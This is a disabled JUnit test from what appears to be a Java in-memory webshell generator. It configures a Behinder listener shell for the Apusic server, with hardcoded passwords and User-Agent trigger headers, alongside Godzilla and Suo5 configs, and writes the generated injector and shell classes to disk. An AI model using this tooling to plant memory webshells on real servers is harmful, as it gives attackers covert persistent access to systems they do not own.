package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.*;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * @author ReaJason
 * @since 2025/2/22
 */
class GeneratorMainTest {

    @Test
    @SneakyThrows
    @Disabled
    void test() {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Apusic)
                .shellTool(ShellTool.Behinder)
                .shellType(ShellType.LISTENER)
                .targetJreVersion(Opcodes.V1_8)
                .debug(true)
                .build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123").build();
        CommandConfig commandConfig = CommandConfig.builder().paramName("listener").build();

        BehinderConfig behinderConfig = BehinderConfig.builder()
                .pass("test123")
                .headerName("User-Agent")
                .headerValue("test").build();

        Suo5Config suo5Config = Suo5Config.builder()
                .headerName("User-Agent")
                .headerValue("test").build();

        InjectorConfig injectorConfig = new InjectorConfig();

        GenerateResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, behinderConfig);
        if (generateResult != null) {
            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
//            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
//            System.out.println(Packers.ScriptEngine.getInstance().pack(generateResult));
//            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
        }
    }
}